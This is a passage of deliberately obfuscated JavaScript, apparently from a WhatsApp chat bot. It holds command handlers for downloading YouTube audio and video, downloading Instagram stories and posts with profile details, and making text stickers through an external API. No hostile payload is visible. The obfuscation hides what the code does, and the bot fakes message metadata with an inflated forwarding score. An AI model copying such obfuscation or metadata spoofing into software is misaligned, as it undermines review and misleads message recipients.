_0xf62f40={};_0xf62f40['mediaUrl']=_0x4583f2[_0x7b773e(0x586,0x3f6,0xcc5,0x82e)],_0xf62f40[_0x7b773e(0x3b8,0x4a7,0x3fa,0x6c6)]=0x2,_0xf62f40[_0x7b773e(0x305,-0x448,0x4a0,0x46)]=_0x1253f4(0x858,0x740,0xb26,0x663)+'4',_0xf62f40['body']='',_0xf62f40['thumbnailU'+'rl']='',_0xf62f40[_0x7b773e(0xd19,0x737,0xa7b,0x85f)]=pp_userz;const _0x2ebced={};_0x2ebced['forwarding'+'Score']=0x3b9aca00;function _0x7b773e(_0x5a9cda,_0x761085,_0x3e93a6,_0x348a3c){return _0x2c6cf8(_0x5a9cda,_0x348a3c-0x204,_0x3e93a6-0x53,_0x348a3c-0x16e);}_0x2ebced['isForwarde'+'d']=!![],_0x2ebced[_0x7b773e(0x6ee,0x68c,0x7cb,0x7e6)+_0x7b773e(0x4b0,0xab,0x53a,0x424)]=!![];function _0x1253f4(_0x48efbc,_0x3921a0,_0x3da1ac,_0x241e4b){return _0x131cb7(_0x3921a0- -0x1ee,_0x3da1ac,_0x3da1ac-0x131,_0x241e4b-0x54);}_0x2ebced[_0x7b773e(0x78,0x381,-0xb5,0xb4)+_0x1253f4(0x172,0x4e7,0x442,0x5ef)]=_0xf62f40;const _0x24067d={};_0x24067d['contextInf'+'o']=_0x2ebced,_0x24067d[_0x7b773e(0x5f5,0x548,0x2e7,0x4db)]=_0x4583f2[_0x7b773e(0x6ba,0x372,0x7c9,0x7c4)],_0x24067d[_0x7b773e(0xda5,0x4d6,0x7d3,0x93a)]=_0xba3acc+'.mp4',_0x24067d['quoted']=fgclink2,_0x24067d[_0x1253f4(0xbc2,0x977,0xdb9,0x92e)]=pp_userz,alpha['sendMessag'+'e'](from,_0xf7ea01,MessageType[_0x7b773e(0x435,-0x3eb,0x42c,0x59)],_0x24067d);});});}catch(_0x36bc09){reply(mess[_0x1f7707(0x71,-0x4d6,-0x1b4,-0x243)][_0x39f25f(-0x1ed,-0x123,-0x507,0xd)]);}}break;case _0x39f25f(-0x8c,0xdd,0x186,0x555):try{reply(lang[_0x1f7707(-0x22e,0x237,0x7c,-0x8)]());let ksjz=q,yut=await yts(ksjz);yta(ksjz)[_0x39f25f(0x35f,0x3e2,0x1ed,0x3fb)](_0x34cee7=>{const _0x4631c2={'yyGYY':_0x542ce0(0x7a8,0x6ef,0x935,0xa45),'JxziR':function(_0x5a5afc,_0x137b65){return _0x5a5afc>=_0x137b65;},'TsqlM':function(_0x349606,_0x3a3d23){return _0x349606(_0x3a3d23);},'JMIal':function(_0x42185b,_0x17b588,_0x25f947,_0x41ca1a){return _0x42185b(_0x17b588,_0x25f947,_0x41ca1a);}};function _0x21fa66(_0x498956,_0x28cfc2,_0x2f4a0a,_0x74a3f1){return _0x39f25f(_0x2f4a0a,_0x74a3f1-0x248,_0x2f4a0a-0xd1,_0x74a3f1-0x1d7);}const {dl_link:_0x23fe3f,thumb:_0x39810a,title:_0x284ba7,filesizeF:_0x4a084a,filesize:_0x293924}=_0x34cee7;function _0x542ce0(_0x4a54a7,_0x1b0348,_0x55b26d,_0x34bbae){return _0x39f25f(_0x55b26d,_0x34bbae-0x419,_0x55b26d-0x121,_0x34bbae-0xe9);}axios['get'](_0x542ce0(0x9d0,0xa50,0x4e9,0x817)+_0x21fa66(0x15b,0x74f,0x71f,0x475)+'api-create'+_0x542ce0(0xb97,0xb04,0xefc,0xa81)+_0x23fe3f)[_0x21fa66(0x7b7,0x90b,0xa7b,0x62a)](async _0xfe07f4=>{const _0x577f6a={};function _0x2fa356(_0x26ddc9,_0x8b73d5,_0x823d15,_0x22cc0f){return _0x21fa66(_0x26ddc9-0x60,_0x8b73d5-0x196,_0x22cc0f,_0x26ddc9- -0x3b4);}function _0x146362(_0x1ee3f8,_0x3e6ea9,_0xf1d71,_0x155dd8){return _0x542ce0(_0x1ee3f8-0x128,_0x3e6ea9-0x1b3,_0x1ee3f8,_0x155dd8- -0x1c3);}_0x577f6a['WJRwu']=_0x4631c2['yyGYY'];const _0x4f01ff=_0x577f6a;if(_0x4631c2[_0x2fa356(0x582,0x57f,0x889,0x268)](_0x4631c2[_0x2fa356(0x62,0x396,-0x454,-0x44c)](Number,_0x293924),0xda78+-0x1a78+-0x4ad0))return _0x4631c2[_0x146362(-0xc,0x6d1,0x68c,0x334)](sendMediaURL,from,_0x39810a,_0x2fa356(0xd0,-0x63,0x42b,0x1b4)+_0x146362(0x780,0x406,0x166,0x5a4)+_0x2fa356(0x69a,0x742,0xb12,0x4aa)+_0x284ba7+(_0x2fa356(-0x193,0x1a9,-0x1e6,0x2f9)+_0x146362(0xa0e,0xa21,0xadc,0xa8a))+yut[_0x2fa356(0x5b7,0x6dc,0x9f7,0x7e4)][-0x1*-0x1b61+0x60*0x18+-0x43*0x8b][_0x2fa356(0x628,0x98d,0x19a,0x245)]+(_0x146362(0x603,0xb56,0x772,0xa7c)+':\x20')+yut[_0x2fa356(0x5b7,0x27c,0x241,0x9e9)][0xdc9+0x2093+-0x2e5c]['ago']+(_0x2fa356(0x25,0x1a4,-0x329,0x19a)+'\x20')+_0x4a084a+_0x146362(0x432,0x5d8,-0xf6,0x27a)+yut[_0x146362(0x58a,0xbb2,0x91d,0x979)][-0x14fe+0x1ada+0x5*-0x12c]['views']+(_0x2fa356(-0x14b,0xc1,-0x4cb,-0x3ad)+_0x146362(0x6f0,0x2fe,0x659,0x777))+yut[_0x146362(0xd31,0xbea,0x524,0x979)][0x1b22+-0x14f5+-0x62d][_0x146362(0x750,0x59a,0x86e,0x623)]+_0x2fa356(0x38f,0x139,0x71,0xbf)+yut[_0x2fa356(0x5b7,0x3a0,0x891,0x51d)][-0x169b+0x2506+-0xe6b][_0x146362(0x273,0x575,0x5de,0x598)]+(_0x146362(0x7d6,0xb8c,0xbf9,0x936)+_0x146362(0x302,0x2c9,-0x152,0x337)+_0x2fa356(0x1ab,0x164,-0x2ea,0x6c)+_0x146362(0xa94,0x7df,0x8af,0x7f1)+_0x2fa356(-0x181,-0x13f,0x2ed,0x30)+'ented\x20in\x20t'+_0x2fa356(0x1b7,0x3,-0x11c,0x4e0)+_0x146362(0x4e6,0xb7,0x1bd,0x2f4)));_0x4631c2['JMIal'](sendMediaURL,from,_0x23fe3f,'')[_0x146362(0x808,0x885,0x801,0x94f)](_0x19dcd3=>{reply(_0x4f01ff['WJRwu']);});});})['catch'](_0x25967a=>reply(''+_0x25967a));}catch(_0x385c92){console[_0x1f7707(0x422,0x41f,0x3f1,0x182)](color(_0x1f7707(0x606,0x413,0x2cb,0x4de),_0x1f7707(0x8c6,0x541,0x64b,0x414)),_0x385c92);}break;case _0x1f7707(0x1b1,0x38d,-0x11d,-0x5bf):try{reply(lang[_0x1f7707(-0x3d6,-0x66,0x7c,-0x342)]());let ksjjz=q,yut=await yts(ksjjz);yta(ksjjz)[_0x1f7707(-0x99,0x57b,0x234,0x221)](_0xff8faa=>{const _0x321b88={};function _0x8e47b0(_0x14b38f,_0x4465e8,_0x1d75cc,_0x1ea979){return _0x39f25f(_0x4465e8,_0x1ea979-0x144,_0x1d75cc-0x8f,_0x1ea979-0x119);}_0x321b88[_0x8e47b0(0x478,-0x1d,0x5bb,0x2fd)]=function(_0x2009a7,_0x29d0ad){return _0x2009a7>=_0x29d0ad;};function _0x2dd717(_0x23b979,_0x51a5f3,_0x10d3a3,_0x4c10e1){return _0x1f7707(_0x23b979-0x38,_0x51a5f3,_0x4c10e1-0x66e,_0x4c10e1-0xf5);}_0x321b88[_0x2dd717(0x685,0xd7d,0x5c6,0x8f7)]=_0x8e47b0(0x50d,0x688,0x4f1,0x701);const _0x3c94d1=_0x321b88,{dl_link:_0x1153ed,thumb:_0x1d6907,title:_0x38ee2f,filesizeF:_0x592ada,filesize:_0x3bf8a2}=_0xff8faa;axios[_0x2dd717(0x56c,0x4af,0x7ca,0x748)]('https://ti'+_0x2dd717(0x42d,0x716,0xa85,0x6ed)+_0x2dd717(0x88e,0xd0e,0x982,0x910)+_0x2dd717(0xdee,0xeee,0xcbd,0xb28)+_0x1153ed)['then'](async _0x183dac=>{if(_0x3c94d1['LXMWc'](Number(_0x3bf8a2),-0x7905+0x1*0x4d21+0xa114))return sendMediaURL(from,_0x1d6907,_0x45219c(-0xea,0x1ee,0x589,0x37c)+'\x20\x20M\x20P\x203*\x0a\x0a'+_0x45219c(0x322,0x7b8,0x94f,0x538)+_0x38ee2f+(_0x50f842(0x9e7,0x485,0x5d5,0x5d9)+_0x45219c(0x479,0x7e6,0x42c,0x5d1))+yut[_0x45219c(0xa9e,0x6d5,0x23c,0x8ed)][-0xa7*-0x2+-0xd*-0xaf+-0xa31][_0x50f842(0xa83,0xfc5,0xd90,0x1132)]+('\x0a🐣\x20Upload\x20'+':\x20')+yut['videos'][-0x15d7+0x3*0x11c+-0x7*-0x2a5][_0x45219c(0x7a4,0x577,0x3d6,0x53e)]+('\x20\x0a🎃\x20Size\x20:'+'\x20')+_0x592ada+_0x45219c(-0x360,-0x2a,0x30,-0x18e)+yut[_0x50f842(0xb23,0xcdc,0xd1f,0x10dd)][0xce7+0x1956+0xfb*-0x27][_0x50f842(0xe25,0xf53,0xbe2,0x742)]+(_0x50f842(0x74a,0x81c,0x61d,0x808)+'on\x20:\x20')+yut[_0x50f842(0xe0d,0xf13,0xd1f,0xc61)][-0x26f*-0x1+-0x1*-0x25cd+0x80c*-0x5][_0x50f842(0xa97,0xb2d,0x9c9,0xe4c)]+_0x45219c(0x5e1,0x4ad,0x4c4,0x16f)+yut[_0x50f842(0x1108,0xaac,0xd1f,0x1013)][0x1f3a+0x1d1f+-0x3c59][_0x45219c(-0x1a6,0x2f4,0x239,0x5f5)]+(_0x45219c(0x31e,0x692,0x9d9,0x644)+_0x50f842(0x465,0x598,0x6dd,0x393)+'of\x20more\x20th'+_0x50f842(0xb0f,0xe7b,0xb97,0xabc)+_0x45219c(-0x50,-0x63,0x153,-0x158)+_0x50f842(0x8c6,0xc30,0xcac,0xbd2)+_0x45219c(0x1c,0x2d5,-0x123,-0xcb)+_0x50f842(0x74e,0xab8,0x69a,0x24a)));let _0x210dff=await getBuffer(_0x1153ed);const _0x3ae104={};_0x3ae104[_0x45219c(0xa33,0x591,0x547,0x744)]=_0x45219c(0x8fb,0x77c,0x390,0x99f)+'utu.be/1r_'+_0x50f842(0x95e,0x322,0x54a,0x4b4),_0x3ae104[_0x45219c(0x1a1,0x51a,0xad,0x47d)]=0x2,_0x3ae104[_0x50f842(0x398,0x3f0,0x4e4,0x6c8)]=_0x50f842(0x875,0xaac,0xac6,0xf05)+'3',_0x3ae104[_0x50f842(0xa7d,0xff5,0xdbf,0x1176)]='',_0x3ae104[_0x50f842(0x506,0x81b,0x868,0x600)+'rl']='',_0x3ae104[_0x45219c(0x681,0x6b3,0x50d,0xa0a)]=pp_userz;const _0x1f54a7={};_0x1f54a7[_0x50f842(0x8e4,0xf82,0xcb6,0x941)+'Score']=0x3b9aca00,_0x1f54a7[_0x50f842(0x3bd,0x606,0x659,0x7f8)+'d']=!![];function _0x45219c(_0x50fe83,_0x2f6a5,_0x3c5b77,_0x48e9cc){return _0x8e47b0(_0x50fe83-0x1ac,_0x48e9cc,_0x3c5b77-0x118,_0x2f6a5- -0x192);}_0x1f54a7['sendEpheme'+_0x50f842(0xb12,0x7fc,0x8c2,0x8fc)]=!![],_0x1f54a7[_0x50f842(0x10e,0x746,0x552,0x167)+_0x45219c(0x2bb,0x223,0x5e1,-0x14c)]=_0x3ae104;const _0x5a4666={};_0x5a4666['contextInf'+'o']=_0x1f54a7;function _0x50f842(_0x5a6231,_0x57c1c2,_0x2897ca,_0x3db252){return _0x8e47b0(_0x5a6231-0x29,_0x3db252,_0x2897ca-0x2c,_0x2897ca-0x4b8);}_0x5a4666[_0x50f842(0xb6a,0xe16,0x979,0xad8)]=_0x3c94d1[_0x45219c(0x4b1,0x3e9,0x26b,0x314)],_0x5a4666[_0x45219c(0x71f,0x78e,0x8ea,0x869)]=_0x38ee2f+_0x45219c(0x6cf,0x3da,-0xd4,0x581),_0x5a4666[_0x45219c(-0x91,0xb8,0x56,-0x3ea)]=fgclink2,_0x5a4666[_0x45219c(0x2d7,0x6b3,0xaf1,0x77f)]=pp_userz,alpha[_0x50f842(0x164,0x4a7,0x578,0x390)+'e'](from,_0x210dff,MessageType[_0x50f842(0x2ff,0x22f,0x4f7,0x820)],_0x5a4666);});})[_0x39f25f(0x49f,0x6f9,0x67b,0x287)](_0x40c2a9=>reply(''+_0x40c2a9));}catch(_0x441314){console[_0x39f25f(0x754,0x59f,0x7bc,0x7b5)](color(_0x39f25f(0x2eb,0x479,0x444,0x437),_0x1f7707(0x31d,0x9d9,0x64b,0xaa2)),_0x441314);}break;case'igstory':case _0x39f25f(0x6ec,0x4ba,0x67b,0x171):case _0x1f7707(-0x2ea,0x8d,-0x282,-0x730)+_0x1f7707(0x151,-0x487,-0x3c,0x454):if(!q)return reply(_0x1f7707(0x90f,0x7d8,0x5ea,0x907)+'a?');pape=q,hx[_0x1f7707(0x24b,0x663,0x263,0x28a)](pape)[_0x39f25f(0xd,0x3e2,0x527,0x45e)](async _0x18e237=>{function _0x553cda(_0x7df33c,_0x354b1f,_0x19de69,_0x7cb0fd){return _0x1f7707(_0x7df33c-0x183,_0x19de69,_0x7df33c-0x386,_0x7cb0fd-0x106);}const _0x2814de={'wnfRP':function(_0x548cd4,_0x460a9f){return _0x548cd4(_0x460a9f);},'rcumC':_0x216cf9(-0xc8,-0x1c9,-0x2bc,-0x367),'VnadH':_0x553cda(0xca,0x435,-0x218,0x21),'VPhht':_0x553cda(0x9d8,0xc1c,0xc82,0x887)};function _0x216cf9(_0x29b1f2,_0x33153e,_0x25f84b,_0x4e197d){return _0x39f25f(_0x29b1f2,_0x33153e- -0xa2,_0x25f84b-0x143,_0x4e197d-0x102);}let _0x39bb0f=await _0x2814de[_0x553cda(0x173,0x1bf,-0x1a1,-0x11e)](getBuffer,_0x18e237[_0x216cf9(0x76c,0x2e0,0x4d4,0x71c)][_0x216cf9(0x340,-0xab,-0x29b,-0x4e6)+'Url']);await alpha[_0x553cda(0x154,0x5c,0xb4,-0x254)+'e'](from,_0x39bb0f,image,{'thumbnail':_0x39bb0f,'quoted':mek,'caption':_0x553cda(0x8f0,0x7cf,0xd4e,0x72a)+_0x216cf9(0x740,0x3a2,0x316,0x74f)+'」'+enter+enter+_0x216cf9(-0xa0,-0x26,0x1e6,0x25c)+_0x18e237[_0x553cda(0x55a,0x339,0x8c6,0x50b)]['id']+enter+('📛\x20*Usernam'+'e\x20:*\x20')+_0x18e237[_0x553cda(0x55a,0x8b7,0x99e,0x811)][_0x216cf9(0x4d7,0x96,-0x361,0x4f9)]+enter+(_0x553cda(0x790,0xab8,0x797,0xbed)+_0x216cf9(0xe8,-0x175,0x51,0x308))+_0x18e237['user'][_0x553cda(0x9f8,0x68c,0x611,0x7fa)]+enter+(_0x216cf9(0x9c3,0x756,0x6fb,0x713)+'rs\x20:*\x20')+_0x18e237[_0x553cda(0x55a,0x104,0x16a,0x803)][_0x216cf9(0x19d,0x4a1,0x139,0x501)]+enter+('✨\x20*Followi'+'ng\x20:*\x20')+_0x18e237['user'][_0x216cf9(0xf9,0x1b6,0x28,0x5e2)]+enter+(_0x216cf9(0x50f,0x608,0x448,0x2cf)+_0x216cf9(0xbb4,0x6fa,0x7e2,0x27b)+_0x216cf9(0x3ca,0x42,0x124,-0xdc)+_0x216cf9(0x787,0x3a6,0x7cd,0xd6))+_0x18e237['user'][_0x216cf9(-0xcf,0x96,0x45c,-0x31f)]+enter+(_0x216cf9(0x659,0x6ee,0xb01,0x7c2)+'*\x20')+_0x18e237[_0x553cda(0x3dc,0x625,0x231,0x65c)][_0x553cda(0x852,0xaef,0x546,0x8b4)]+_0x553cda(0x26e,0x21d,-0x1ec,0x59d)+enter+enter+(_0x216cf9(0x4b3,0x53b,0x1bf,0x5e8)+_0x216cf9(0x69,-0xd3,-0xd4,0x2da)+_0x553cda(0x97b,0xaad,0xe24,0x9c5)+_0x216cf9(0x408,0x2d0,0x386,-0x2b)+'_')});for(let _0x3d16e4 of _0x18e237[_0x553cda(0x3dc,0x2b5,0x67d,0x85e)]){if(_0x3d16e4[_0x216cf9(0x38d,0x2a0,-0x11d,0x684)][_0x216cf9(0x63d,0x4ab,0xe7,0x55e)](_0x2814de[_0x553cda(0xe7,0x445,-0x3aa,0x3c3)])){if(_0x2814de[_0x216cf9(0x550,0x486,0x94,0x599)]!==_0x2814de['VPhht']){let _0x3710e2=await getBuffer(_0x3d16e4[_0x553cda(0x51a,0x2c5,0x62b,0x138)]);alpha['sendMessag'+'e'](from,_0x3710e2,video,{'thumbnail':Buffer[_0x553cda(0x2cc,-0xe1,0x3a8,0x63e)](-0x133*0xa+-0x22*-0x65+-0x16c),'quoted':mek,'caption':'Instagram\x20'+'•\x20'+_0x3d16e4[_0x553cda(0x8a6,0x90d,0xcdc,0xb14)]});}else _0x57db24=''+_0x120a82['images'][0x1b*-0x5c+0x153*-0x15+0x2583]['url'],_0x3d01ed['log'](_0x10b42a),_0x2dd406(_0x40c568,''+_0x2f29da);}else{let _0x224fa3=await getBuffer(_0x3d16e4[_0x216cf9(0x200,0x2a0,-0x19,-0x149)]);alpha[_0x553cda(0x154,0x4f,0xf3,-0x270)+'e'](from,_0x224fa3,image,{'thumbnail':Buffer[_0x216cf9(-0x421,0x52,-0x459,-0x355)](-0x293+0x5*0x55+0xea),'quoted':mek,'caption':_0x216cf9(0xbf4,0x767,0x361,0xb23)+'•\x20'+_0x3d16e4[_0x553cda(0x8a6,0x600,0x864,0xcbf)]});}}})[_0x39f25f(0x2b7,0x6f9,0x513,0x523)](_0x4036c3=>reply(_0x39f25f(0x260,0x4a7,0x42e,0x873)+_0x1f7707(0x99d,0x629,0x62a,0x7ac)+_0x1f7707(0x88,0x255,0x53a,0x670)+_0x39f25f(0x4f0,0xeb,0x178,0x134)+_0x39f25f(0x295,0x2b,0x210,-0x1e9)));break;case'ig':case'igdl':case _0x1f7707(-0x6bb,0x1d2,-0x2a2,-0x2e3):case _0x1f7707(0x723,0x1f1,0x514,0x786):case _0x1f7707(0x675,0x12b,0x46f,0x62c):case _0x39f25f(0x4b5,0x73,-0x2f9,-0x3bb):case'igvideo':case _0x1f7707(0x22b,0x22e,0x3d1,-0xa):case _0x1f7707(0x1a2,0x645,0x4e8,0x2d9):case _0x39f25f(0xa6d,0x619,0x7f3,0x902):case'instareels':case _0x1f7707(0x1be,0xb0,0x3a9,0x222):case _0x1f7707(-0x14c,0x4e8,0xc6,0x4aa):case'instatv':if(!isUrl(args[0x2639+-0x1*0x109+-0x4*0x94c])&&!args[0x2*-0x207+0x1d60+0xca9*-0x2][_0x39f25f(0x5fa,0x54d,0x81c,0x983)](_0x1f7707(0x10b,0x4df,0x3e4,0x711)+_0x1f7707(-0x123,0x41a,0x187,0x501)))return reply(lang[_0x39f25f(-0x209,-0x3c,0x40e,-0x452)]());let urlnya=q;hx[_0x1f7707(0x316,0x2ea,0x52,-0x402)](urlnya)[_0x1f7707(-0x1e7,-0x15f,0x234,-0x127)](async _0x46a2b3=>{const _0x4f0084={'YtnqH':function(_0x1d0d44,_0x43756f,_0x146399){return _0x1d0d44(_0x43756f,_0x146399);},'lPfwJ':_0x120fe4(0xccc,0xec4,0xcfa,0xcfb),'dzVAQ':_0x120fe4(0x95c,0x7d8,0x91b,0xb1b)+'ge\x20welcome'+_0xa47fc6(0x3fa,0x530,0x5d6,0xa42),'Oukax':function(_0x428f23,_0x5cbab2){return _0x428f23(_0x5cbab2);},'LKyUa':function(_0x225319,_0x4e1d09){return _0x225319===_0x4e1d09;},'KERHA':_0x120fe4(0xc9a,0xc1d,0xcdb,0x8af),'SjbOz':_0x120fe4(0x946,0xddd,0x95b,0xc1c),'baFeH':_0x120fe4(0x4c4,0x4e7,0x90c,0x7bf),'NNQha':'WMvzc'};let _0xe0262c=await _0x4f0084[_0x120fe4(0xa5a,0x96f,0xe58,0x9b7)](getBuffer,_0x46a2b3[_0xa47fc6(0x343,0x5a1,0x6ba,0x7c3)][_0x120fe4(0x5e2,0x532,0x63e,0x73c)+'Url']);await alpha[_0xa47fc6(0x271,0x570,0x2b4,0x34a)+'e'](from,_0xe0262c,image,{'thumbnail':_0xe0262c,'quoted':mek,'caption':_0xa47fc6(0x7bf,0xb29,0xa50,0xcb8)+'AM\x20DOWNLOA'+_0x120fe4(0x9bd,0x91d,0xb32,0x874)+enter+enter+_0xa47fc6(0x2ee,0x791,0x3b4,0x549)+_0x46a2b3[_0xa47fc6(0x6c6,0x792,0x6ba,0x494)]['id']+enter+(_0xa47fc6(0x8b9,0x668,0x9be,0x636)+'e\x20:*\x20')+_0x46a2b3[_0xa47fc6(0x63b,0xb01,0x6ba,0x6a4)][_0x120fe4(0x723,0x966,0x386,0x963)]+enter+(_0xa47fc6(0x434,0xc13,0x8f0,0xc2a)+_0x120fe4(0x518,0x47b,0x76e,0x568))+_0x46a2b3[_0xa47fc6(0x894,0x9d4,0x6ba,0x4c4)][_0xa47fc6(0xc66,0xcc7,0xb58,0xdc0)]+enter+(_0x120fe4(0xde3,0xa2d,0x1157,0xc8f)+_0xa47fc6(0x5a7,0x7b8,0x78e,0xac4))+_0x46a2b3[_0xa47fc6(0x5e1,0x41c,0x6ba,0x5ec)][_0x120fe4(0xb2e,0xd05,0x813,0x826)]+enter+(_0x120fe4(0x993,0x8bd,0xd7a,0x688)+'ng\x20:*\x20')+_0x46a2b3[_0xa47fc6(0x7e0,0x240,0x6ba,0x6da)]['following']+enter+(_0xa47fc6(0xdfa,0x7bc,0x9e2,0x8dd)+_0xa47fc6(0xa3e,0xd8f,0xad4,0x627)+_0x120fe4(0x6cf,0x8dc,0x3f9,0x2eb)+_0xa47fc6(0x7fa,0xc20,0x780,0x913))+_0x46a2b3[_0xa47fc6(0xaf6,0x4b2,0x6ba,0xaca)]['username']+enter+(_0x120fe4(0xd7b,0xbc2,0xd67,0x11fa)+'*\x20')+_0x46a2b3[_0x120fe4(0x7ef,0x3fc,0x7cd,0x8ff)][_0xa47fc6(0xd1c,0xab0,0x9b2,0xa97)]+'\x20Media'+enter+enter+(_0x120fe4(0xbc8,0xe75,0x1041,0xe97)+_0x120fe4(0x5ba,0x28e,0x52c,0x383)+'t\x20media\x20ak'+_0x120fe4(0x95d,0xd81,0x720,0x4b8)+'_')});function _0xa47fc6(_0x22c748,_0xfd4c99,_0x48be88,_0x499656){return _0x1f7707(_0x22c748-0x3c,_0x499656,_0x48be88-0x4e6,_0x499656-0xdc);}function _0x120fe4(_0x5943eb,_0x3b1e74,_0x11f665,_0x4029c9){return _0x39f25f(_0x11f665,_0x5943eb-0x5eb,_0x11f665-0x18d,_0x4029c9-0x60);}for(let _0x118fbf of _0x46a2b3['medias']){if(_0x4f0084[_0x120fe4(0x8c5,0xd74,0x7c9,0xbc6)](_0x4f0084[_0xa47fc6(0x40c,0x53d,0x5d0,0x7d5)],_0x4f0084['SjbOz']))_0xd10ee2[_0x120fe4(0xb8a,0x1012,0x959,0xbd6)](_0x4f0084['YtnqH'](_0x4e83b4,_0x7a1eb8,_0x4f0084[_0x120fe4(0xda9,0x11f4,0x1103,0xfde)]),_0xd5fab3(_0x4f0084[_0xa47fc6(0xcb2,0xddb,0xa5a,0xd9c)])),_0x4f0084[_0x120fe4(0xa5a,0x6cc,0x781,0xc16)](_0x33fd0e,'☕');else{if(_0x118fbf[_0xa47fc6(0x275,0x98c,0x67a,0x60e)][_0x120fe4(0xb38,0xfc8,0xbbd,0x9bc)](_0x4f0084[_0xa47fc6(0x652,0x3f6,0x67c,0x4ba)])){let _0x45cfdf=await _0x4f0084['Oukax'](getBuffer,_0x118fbf[_0xa47fc6(0x773,0x6ea,0x67a,0x8ba)]);alpha[_0x120fe4(0x567,0x38d,0x34b,0x1b0)+'e'](from,_0x45cfdf,video,{'thumbnail':Buffer[_0xa47fc6(0x755,0x525,0x42c,0x66d)](-0xf2*0x4+0x1a7+-0x6d*-0x5),'quoted':mek,'caption':_0xa47fc6(0xa12,0x713,0xb41,0xb64)+_0xa47fc6(0xa1f,0xdb0,0x981,0x77c)+_0x118fbf['type']});}else{if(_0x4f0084[_0x120fe4(0x8c5,0x5dc,0xa91,0x697)](_0x4f0084[_0xa47fc6(0x715,0xc8d,0x8fc,0xd34)],'WMvzc')){let _0x24b618=await _0x4f0084[_0xa47fc6(0xc44,0x577,0x7a7,0xb00)](getBuffer,_0x118fbf[_0x120fe4(0x92d,0x5cc,0xc2c,0x5e2)]);alpha[_0x120fe4(0x567,0x1ff,0x270,0x816)+'e'](from,_0x24b618,image,{'thumbnail':Buffer['alloc'](-0x20f1+-0xeec+0x2fdd),'quoted':mek,'caption':_0x120fe4(0xdf4,0x1026,0x100b,0xe39)+'•\x20'+_0x118fbf['type']});}else{const _0x4a0461={};_0x4a0461['contentTex'+'t']=_0x23b846,_0x4a0461[_0x120fe4(0xdd0,0xe7c,0x949,0x1069)]=_0x3750e2,_0x4a0461[_0x120fe4(0xb84,0xfab,0x1039,0xea1)]=_0x297d8c,_0x4a0461['headerType']=0x1;const _0x100725=_0x4a0461;_0x276ec5[_0xa47fc6(0x1c5,0x6e6,0x2b4,0x66c)+'e'](_0x23d4ba,_0x100725,_0x5c7f54[_0x120fe4(0x7fe,0x8e2,0xb66,0xa87)+_0xa47fc6(0x141,0x29e,0x2ab,0x5d4)],_0x4903eb);}}}}})['catch'](_0x59ca27=>reply(_0x39f25f(0x9f0,0x574,0x290,0x5eb)+_0x39f25f(0x765,0x5da,0x6e9,0x456)+'u\x20mungkin\x20'+_0x39f25f(0x98e,0x70f,0x75c,0x352)+'te'));break;case'ttp1':if(args[_0x1f7707(0x331,0x2eb,0x4cc,0x7d4)]<0x5b4+0x1240+0x17f3*-0x1)return reply(lang[_0x1f7707(0x8aa,0x277,0x52a,0x6f)](prefix,command));hhh=q,p=await getBuffer('https://ha'+_0x39f25f(-0x1e2,-0xfb,-0x38e,0x27c)+'an.herokua'+_0x39f25f(0x1af,-0xf9,-0x2d8,0xd5)+_0x1f7707(-0x332,0x22b,0xd5,-0x22a)+_0x39f25f(0x128,0x4d0,0xea,0x217)+hhh+(_0x39f25f(-0xdc,0x4b,0x119,-0x2d6)+_0x39f25f(0x480,0x20c,0x501,-0x1c9)+'ardianto'));const _0x2d33ac={};_0x2d33ac[_0x1f7707(-0x544,-0x323,-0xa8,0x183)]=fgclink,alpha[_0x39f25f(0x25d,-0x84,-0x4ea,-0x2de)+'e'](from,p,sticker,_0x2d33ac);break;case'ttp2':if(args[_0x39f25f(0x826,0x67a,0x979,0x454)]<0x1*0xe2f+0x1a7c+0x5*-0x822)return reply(lang[_0x1f7707(0x6b2,0x1f4,0x52a,0x441)](prefix,command));hhh=q,pp=await getBuffer('https://ha'+_0x39f25f(0x3a0,-0xfb,-0x2cd,0x325)+_0x39f25f(0x204,-0x14,0x369,-0x42)+_0x1f7707(-0x442,-0x4ce,-0x2a7,0xb1)+_0x39f25f(0x10a,0x283,-0x78,-0x1ab)+_0x1f7707(0x431,0x58a,0x322,0x564)+hhh+(_0x1f7707(-0x3ef,0x309,-0x160,0x29a)+_0x1f7707(0x4d0,0x438,0x10e,-0x36a)+'=hardianto'));const _0x4c9138={};_0x4c9138[_0x1f7707(0x4f,0x1aa,-0xa8,0x3ef)]=fgclink,alpha[_0x39f25f(0x1cb,-0x84,0x1fe,-0x2db)+'e'](from,pp,sticker,_0x4c9138);break;case _0x1f7707(0x8a4,0x91c,0x4d9,0x659):if(args[_0x39f25f(0x691,0x67a,0x811,0x651)]<-0x1d2b+-0x133d+-0x9*-0x561)return reply(lang['noteks'](prefix,command));hhh=q,ppp=await getBuffer(_0x1f7707(-0x27,-0x501,-0x1e0,-0x347)+_0x1f7707(-0x3a7,-0xf7,-0x2a9,-0x696)+'an.herokua'+_0x39f25f(0x2de,-0xf9,-0x171,0x18)+'/ttpcustom'+_0x39f25f(0x5ec,0x4d0,0x382,0x14)+hhh+('&color=red'+_0x1f7707(0xc7,0x89d,0x51b,0x74c)+_0x39f25f(0x459,0x26a,0x4d7,0x629)));const _0x214aaf={};_0x214aaf['quoted']=fgclink,alpha['sendMessag'+'e'](from,ppp,sticker,_0x214aaf);break;case _0x39f25f(-0x46,0x29,-0x269,-0x1d7):if(args[_0x1f7707(0x90e,0x1fd,0x4cc,0x32a)]<-0x1583*0x1+0x10ae+0x1*0x4d6)return reply(lang[_0x1f7707(0x47d,0x6c5,0x52a,0x732)](prefix,command));hhh=q,pppp=await getBuffer('https://ha'+_0x39f25f(-0x56a,-0xfb,0x3b,0x23f)+_0x39f25f(0x1c1,-0x14,0x436,-0xc4)+_0x39f25f(0x17a,-0xf9,0x18a,-0x238)+'/ttpcustom'+_0x1f7707(0x571,-0x77,0x322,0x7cd)+hhh+(_0x39f25f(-0xb1,0x20f,0xb5,0x3c1)+_0x1f7707(-0x17e,-0x1a2,0x19a,0x63c)+_0x1f7707(0x91,0x223,0x346,-0x32)));const _0x4e67e2={};_0x4e67e2[_0x39f25f(-0x286,0x106,0x4b5,0x5aa)]=fgclink,alpha[_0x39f25f(0x14c,-0x84,-0xb4,0x307)+'e'](from,pppp,sticker,_0x4e67e2);break;case _0x39f25f(0x46d,0x293,0x6ef,0x58a):case _0x39f25f(0x127,0x422,-0x85,0x6a5):if(!isGroup)return reply(lang['onlygc']());var 